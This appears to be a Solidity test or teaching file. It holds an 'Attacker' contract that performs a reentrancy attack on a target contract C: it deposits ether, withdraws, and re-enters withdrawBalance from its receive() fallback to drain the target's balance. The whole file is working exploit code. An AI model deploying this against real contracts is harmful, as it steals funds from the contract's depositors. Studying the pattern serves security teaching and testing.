contract Attacker {
    C public target;
    uint256 public depth;
    uint256 public reentrantDepth;
    uint256 public initialDeposit;
    constructor(C _target) { target = _target; }
    function attack(uint256 _reentrantDepth) external payable {
        reentrantDepth = _reentrantDepth;
        initialDeposit = msg.value;
        target.addToBalance{value: msg.value}();
        target.withdrawBalance();
    }
    receive() external payable {
        if (depth < reentrantDepth) {
            depth++;
            if (address(target).balance >= initialDeposit) {
                target.withdrawBalance();
            }
        }
    }
}

